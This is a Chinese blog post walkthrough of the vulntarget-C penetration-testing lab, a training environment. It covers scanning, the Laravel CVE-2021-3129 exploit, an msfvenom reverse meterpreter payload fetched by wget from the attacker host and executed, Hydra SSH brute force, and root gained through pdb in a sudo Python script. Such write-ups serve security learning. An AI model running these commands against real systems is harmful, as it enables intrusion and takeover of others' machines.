@@ -1,0 +1,1013 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E8%95%BE%E5%A7%86.png">
+  <link rel="icon" href="/img/%E8%95%BE%E5%A7%86.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#58C9B9">
+  <meta name="author" content="SCxiaoyun">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="vulntarget-C靶场复现 ¶靶场相关信息    实验目标：拿取Ubuntu 16主机的Flag信息   学习目标：Laravel&#x2F;OVAS-PHP漏洞&#x2F;隧道代理&#x2F;免杀&#x2F;提权&#x2F;CVE-2021-3129&#x2F;CVE-2021-3493等  123456789101112131415161718192021222324#攻击机OS：KaliNIC:192.168.172.129#Ubuntu-Se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget-c打靶复现">
+<meta property="og:url" content="https://jsweetcoffee.github.io/posts/64d31b65.html">
+<meta property="og:site_name" content="晓雲的陋室">
+<meta property="og:description" content="vulntarget-C靶场复现 ¶靶场相关信息    实验目标：拿取Ubuntu 16主机的Flag信息   学习目标：Laravel&#x2F;OVAS-PHP漏洞&#x2F;隧道代理&#x2F;免杀&#x2F;提权&#x2F;CVE-2021-3129&#x2F;CVE-2021-3493等  123456789101112131415161718192021222324#攻击机OS：KaliNIC:192.168.172.129#Ubuntu-Se">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/1658220557909-5140e4ce-1eff-45ba-b780-24c0cec931a1.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802104152610-1690944115063-3.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802104450384-1690944291966-5.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802104905403-1690944546862-7.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802110104897-1690945296206-9.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802110141191-1690945302072-11.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802110329245-1690945410528-13.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802110541956-1690945543565-15.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802110813345-1690945694657-17.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802111015452-1690945816674-19.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802111226912-1690945947995-21.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802111541416-1690946142574-23.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802111824482-1690946305875-25.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802112107663-1690946468783-27.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802112129482-1690946490532-29.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802112215184-1690946537265-31.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802113453010.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802113626976.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802113638797.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802114005210-1690947607065-33.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802114156113-1690947717527-35.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802114603109-1690947964275-37.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802114613812.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802114639478-1690948001101-39.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802115057393-1690948258941-41.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802133652596.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802134217540.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802140023245.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/1658308045365-9b249b12-f581-48c9-b09b-dcb8150bb9d9.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/3-5.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802140441107.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/3-8.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802140803302.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141013008.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141106157.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141157813.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141203363.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141235669.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141426031.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141448114.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802141922688.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802142126819.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/image-20230802142146859.png">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-2.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-3.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-4.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-5.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-6-1690957696036-60.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-7.jpg">
+<meta property="og:image" content="https://jsweetcoffee.github.io/posts/64d31b65/4-9.jpg">
+<meta property="article:published_time" content="2023-07-28T01:57:34.000Z">
+<meta property="article:modified_time" content="2023-08-18T09:12:14.000Z">
+<meta property="article:author" content="SCxiaoyun">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="网安">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/64d31b65/1658220557909-5140e4ce-1eff-45ba-b780-24c0cec931a1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>vulntarget-c打靶复现 - 晓雲的陋室</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jsweetcoffee.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"♫","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"ture","follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>聊五分钱的天吗？|ω･)و ̑̑༉</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/pic9.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulntarget-c打靶复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        SCxiaoyun
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-28 09:57" pubdate>
+          2023年7月28日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulntarget-c打靶复现</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年8月18日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>vulntarget-C靶场复现</h1>
+<h2 id="靶场相关信息"><a class="header-anchor" href="#靶场相关信息">¶</a>靶场相关信息</h2>
+ <img src="/posts/64d31b65/1658220557909-5140e4ce-1eff-45ba-b780-24c0cec931a1.png" class title="img">
+<blockquote>
+<p>实验目标：拿取Ubuntu 16主机的Flag信息</p>
+</blockquote>
+<blockquote>
+<p>学习目标：Laravel/OVAS-PHP漏洞/隧道代理/免杀/提权/CVE-2021-3129/CVE-2021-3493等</p>
+</blockquote>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#攻击机</span><br>OS：Kali<br><span class="hljs-symbol">NIC:</span><span class="hljs-number">192.168</span><span class="hljs-number">.172</span><span class="hljs-number">.129</span><br><br><span class="hljs-meta">#Ubuntu-Server</span><br><span class="hljs-symbol">OS:</span>Ubuntu <span class="hljs-number">20</span><br><span class="hljs-symbol">Server:</span>Laravel <span class="hljs-number">8.4</span><span class="hljs-number">.2</span><br><span class="hljs-symbol">userpass:</span>root/root<span class="hljs-meta">#qwe</span><br><span class="hljs-symbol">userpass:</span>vulntarget/root<br><span class="hljs-symbol">NIC1:</span><span class="hljs-number">192.168</span><span class="hljs-number">.172</span><span class="hljs-number">.110</span> --&gt;nat模式，桥接不好使<br><span class="hljs-symbol">NIC2:</span><span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.141</span>  --&gt;仅主机模式网卡<br><br><span class="hljs-meta">#Wins16-Server</span><br><span class="hljs-symbol">OS:</span>Windows server <span class="hljs-number">2016</span><br><span class="hljs-symbol">Server:</span>OVAS-PHP CMS<br>userpass：administrator:Admin<span class="hljs-meta">#123</span><br><span class="hljs-symbol">NIC1:</span><span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.100</span>   --&gt;仅主机模式网卡<br><span class="hljs-symbol">NIC2:</span><span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.139</span>    --&gt;仅主机模式网卡<br><br><span class="hljs-meta">#Ubuntu16-Server</span><br><span class="hljs-symbol">OS:</span>Ubuntu <span class="hljs-number">16</span><br>userpass：vulntarget:Admin<span class="hljs-meta">#123</span><br>NIC1：<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span><br><br></code></pre></td></tr></table></figure>
+<h2 id="主机配置"><a class="header-anchor" href="#主机配置">¶</a>主机配置</h2>
+<p>Ubuntu20 配置</p>
+<p>先用用户名和密码登录上去</p>
+<p>修改/etc/netplan下的网络配置文件，将网络ip改成自己的网段ip</p>
+<img src="/posts/64d31b65/image-20230802104152610-1690944115063-3.png" class title="image-20230802104152610">
+<blockquote>
+<p>****备注：****Netplan —— 抽象网络配置生成器 ，是一个用于配置 Linux 网络的简单工具</p>
+</blockquote>
+<p>生效</p>
+<p><code>netplan apply</code></p>
+<img src="/posts/64d31b65/image-20230802104450384-1690944291966-5.png" class title="image-20230802104450384">
+<h2 id="边界主机"><a class="header-anchor" href="#边界主机">¶</a>边界主机</h2>
+<p>信息收集</p>
+<p><strong>先nmap探测一下网段环境</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.172.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<img src="/posts/64d31b65/image-20230802104905403-1690944546862-7.png" class title="image-20230802104905403">
+<p>已经探测出开放着22端口和80端口，猜测后续可以通过ssh连接，并且开启有http服务。进行进行信息搜集。</p>
+<p><strong>探测主机详细信息</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -sT -<span class="hljs-keyword">A</span> -sV  <span class="hljs-number">192.168.172.110</span><br></code></pre></td></tr></table></figure>
+<img src="/posts/64d31b65/image-20230802110104897-1690945296206-9.png" class title="image-20230802110104897">
+<p>访问一下80端口的http服务</p>
+<img src="/posts/64d31b65/image-20230802110141191-1690945302072-11.png" class title="image-20230802110141191">
+<p>Laravel框架，好，没见过，复现结束。。。😤</p>
+<p>不小心看到了版本信息，连上82年的网找找漏洞。</p>
+<p><strong>Laravel v8.78.1 (PHP v7.4.3)</strong></p>
+<p>最新不过2021的，版本好像也不对啊，死马当活马医😫</p>
+<img src="/posts/64d31b65/image-20230802110329245-1690945410528-13.png" class title="image-20230802110329245">
+<p>Github尝试一下找工具</p>
+<p>还真有，看一下readme如何食用😁</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p>
+<img src="/posts/64d31b65/image-20230802110541956-1690945543565-15.png" class title="image-20230802110541956">
+<p>好家伙一个参数没有，估计是写死了，还得改代码，主要是还要另外整gcc估计难搞。</p>
+<p>还得下个别的工具，不好使，换一个。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p>
+<p>简单配置试一下</p>
+<img src="/posts/64d31b65/image-20230802110813345-1690945694657-17.png" class title="image-20230802110813345">
+<p>ok一步到胃！一会儿找找源码中id的执行位置，替换成反弹shell的命令。</p>
+<p>先用美少妇（MSF）生成一个反向马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.172.129 LPORT=6666 -f elf -o 98.elf<br></code></pre></td></tr></table></figure>
+<img src="/posts/64d31b65/image-20230802111015452-1690945816674-19.png" class title="image-20230802111015452">
+<p>在这个文件夹下用python开个http服务一会儿用工具让靶机下载马子。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m http.server 9090<br></code></pre></td></tr></table></figure>
+<p>访问一下，ok了。</p>
+<img src="/posts/64d31b65/image-20230802111226912-1690945947995-21.png" class title="image-20230802111226912">
+<p>老规矩MSF开启监听。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp <br>payload =&gt; linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; set lhost 192.168.172.129<br>lhost =&gt; 192.168.172.129<br>msf6 exploit(multi/handler) &gt; set lport 6666<br>lport =&gt; 6666<br>msf6 exploit(multi/handler) &gt; run<br></code></pre></td></tr></table></figure>
+<p>用咱们刚下载的工具找到命令执行的位置（找&quot;id&quot;），将其替换为如下语句：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /var/www/html/public&amp;&amp;wget http://192.168.172.129:9090/98.elf&amp;&amp;chmod 777 98.elf&amp;&amp;./98.elf<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>坑：需要先cd /var/www/html/public，不然命令执行位置不在下载木马的位置，无法反弹。</p>
+</blockquote>
+<p>上线！😎😎😎</p>
+<img src="/posts/64d31b65/image-20230802111541416-1690946142574-23.png" class title="image-20230802111541416">
+<p>继续进行信息收集,先看看我是个什么东西。。。</p>
+<img src="/posts/64d31b65/image-20230802111824482-1690946305875-25.png" class title="image-20230802111824482">
+<p>啥也不是！提权！</p>
+<p>方法一：</p>
+<p>Msf内置后渗透模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure>
+<p>报了一堆错误，玩不了……</p>
+<p>方法二：</p>
+<p>查看/home目录下用户有哪些。发现存在vulntarget用户尝试使用Hydra进行SSH爆破，获得密码root</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -l vulntarget -P passwd.txt 192.168.172.110 ssh<br></code></pre></td></tr></table></figure>
+<img src="/posts/64d31b65/image-20230802112107663-1690946468783-27.png" class title="image-20230802112107663">
+<img src="/posts/64d31b65/image-20230802112129482-1690946490532-29.png" class title="image-20230802112129482">
+<p>直接先登上去再说</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh vulntarget@192.168.172.110<br></code></pre></td></tr></table></figure>
+<p>看哪些可以进行权限提升</p>
+<img src="/posts/64d31b65/image-20230802112215184-1690946537265-31.png" class title="image-20230802112215184">
+<p>python3?整！</p>
+<p>查看/opt/root.py文件内容。运行脚本会在本地的<code>1025-65535</code>端口上开启一个<code>socket</code>接口且密码是<code>mortals</code>登录成功后根据选项给出响应的回显如果有错误的输入在异常处理处打印异常且调用<code>pdb</code>模块，同时进入到调式模块下在此模块中可导入<code>OS</code>模块来执行系统命令完成提权。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> pdb<br><br>port = random.randint(<span class="hljs-number">1025</span>, <span class="hljs-number">65535</span>)  <br><br><span class="hljs-keyword">try</span>:<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sock.bind((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port))<br>    sock.listen(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Listening on localhost:<span class="hljs-subst">&#123;port&#125;</span>&#x27;</span>)<br>    <br>    (clientsock, addr) = sock.accept() <br>    clientsock.send(<span class="hljs-string">b&#x27;Enter the secret passsword: &#x27;</span>)  <br>    <span class="hljs-keyword">if</span> clientsock.recv(<span class="hljs-number">1024</span>).strip().decode() != <span class="hljs-string">&#x27;mortals&#x27;</span>:<br>        clientsock.send(<span class="hljs-string">b&#x27;Wrong password!\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        clientsock.send(<span class="hljs-string">b&#x27;Welcome admin!\n&#x27;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            clientsock.send(<span class="hljs-string">b&#x27;\nWhat do you wanna do: \n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[1] View processes\n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[2] View free memory\n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[3] View listening sockets\n&#x27;</span>)<br>            clientsock.send(<span class="hljs-string">b&#x27;[4] Quit\n&#x27;</span>)<br>            option = <span class="hljs-built_in">int</span>(clientsock.recv(<span class="hljs-number">1024</span>).strip())<br>            <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;ps aux&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;df&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:<br>                clientsock.send(subprocess.getoutput(<span class="hljs-string">&#x27;ss -lnt&#x27;</span>).encode())<br>            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">4</span>:<br>                clientsock.send(<span class="hljs-string">b&#x27;Bye\n&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>    pdb.post_mortem(e.__traceback__)<br><span class="hljs-keyword">finally</span>:<br>    quit()<br></code></pre></td></tr></table></figure>
+<p>在第一个ssh链接上执行脚本文件，另外开启一个ssh链接监听脚本开启的端口并进行错误的输入。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">SSH1:<br>sudo python3 /opt/root.py<br><br>SSH2:<br>nc localhost 26676  //这个端口是脚本开启的那个<br>mortals<br>a<br></code></pre></td></tr></table></figure>
+<img src="/posts/64d31b65/image-20230802113453010.png" class title="image-20230802113453010">
+<img src="/posts/64d31b65/image-20230802113626976.png" class title="image-20230802113626976">
+<p>然后执行以下命令：赋予 /bin/bash读写权限并执行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">os.system(&#x27;chmod u+s /bin/bash&amp;&amp;bash -p&#x27;)<br></code></pre></td></tr></table></figure>
+<img src="/posts/64d31b65/image-20230802113638797.png" class title="image-20230802113638797">
+<p>root！斯巴拉西！👍👍👍</p>
+<p>还有另外一种方法，这里把bin/bash复制到一个临时文件夹下，然后再给权限，执行，同样也可以提权。</p>
+<img src="/posts/64d31b65/image-20230802114005210-1690947607065-33.png" class title="image-20230802114005210">
